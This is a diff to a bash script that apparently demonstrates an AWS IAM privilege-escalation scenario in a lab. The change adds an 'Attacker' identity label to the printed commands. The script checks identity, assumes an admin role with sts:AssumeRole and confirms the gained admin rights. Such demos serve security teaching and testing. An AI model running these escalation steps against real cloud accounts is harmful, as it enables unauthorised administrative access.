@@ -22,12 +22,14 @@ ATTACK_COMMANDS=()
 
 # Display a command before executing it
 show_cmd() {
-    echo -e "${DIM}\$ $*${NC}"
+    local identity="$1"; shift
+    echo -e "${DIM}[${identity}] \$ $*${NC}"
 }
 
 # Display AND record an attack command
 show_attack_cmd() {
-    echo -e "\n${CYAN}\$ $*${NC}"
+    local identity="$1"; shift
+    echo -e "\n${CYAN}[${identity}] \$ $*${NC}"
     ATTACK_COMMANDS+=("$*")
 }
 
@@ -70,7 +72,7 @@ cd - > /dev/null  # Return to scenario directory
 
 # Step 2: Verify identity as starting user
 echo -e "${YELLOW}Step 2: Verifying identity${NC}"
-show_cmd "aws sts get-caller-identity --query 'Arn' --output text"
+show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
 CURRENT_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
 echo "Current identity: $CURRENT_IDENTITY"
 
@@ -83,7 +85,7 @@ echo -e "${GREEN}✓ Verified identity as $STARTING_USER${NC}\n"
 # Step 3: Verify we don't have admin permissions yet
 echo -e "${YELLOW}Step 3: Verifying we don't have admin permissions yet${NC}"
 echo "Attempting to list IAM users (should fail)..."
-show_cmd "aws iam list-users --max-items 1"
+show_cmd "Attacker" "aws iam list-users --max-items 1"
 if aws iam list-users --max-items 1 &> /dev/null; then
     echo -e "${RED}⚠ Unexpectedly have list-users permission already${NC}"
 else
@@ -95,7 +97,7 @@ echo ""
 echo -e "${YELLOW}Step 4: Assuming admin role via sts:AssumeRole${NC}"
 echo "Role ARN: $ADMIN_ROLE_ARN"
 
-show_attack_cmd "aws sts assume-role --role-arn \"$ADMIN_ROLE_ARN\" --role-session-name \"sts-001-demo-session\""
+show_attack_cmd "Attacker" "aws sts assume-role --role-arn \"$ADMIN_ROLE_ARN\" --role-session-name \"sts-001-demo-session\""
 ASSUME_ROLE_OUTPUT=$(aws sts assume-role \
     --role-arn "$ADMIN_ROLE_ARN" \
     --role-session-name "sts-001-demo-session")
@@ -109,7 +111,7 @@ echo -e "${GREEN}✓ Successfully assumed role $ADMIN_ROLE_NAME${NC}\n"
 
 # Step 5: Verify admin identity
 echo -e "${YELLOW}Step 5: Verifying new identity${NC}"
-show_cmd "aws sts get-caller-identity --query 'Arn' --output text"
+show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
 NEW_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
 echo "New identity: $NEW_IDENTITY"
 
@@ -122,7 +124,7 @@ echo -e "${GREEN}✓ Verified identity as $ADMIN_ROLE_NAME${NC}\n"
 # Step 6: Verify we now have admin permissions
 echo -e "${YELLOW}Step 6: Verifying admin permissions${NC}"
 echo "Attempting to list IAM users..."
-show_cmd "aws iam list-users --max-items 1"
+show_cmd "Attacker" "aws iam list-users --max-items 1"
 if aws iam list-users --max-items 1 > /dev/null; then
     echo -e "${GREEN}✓ Success! Can now list IAM users${NC}"
 else
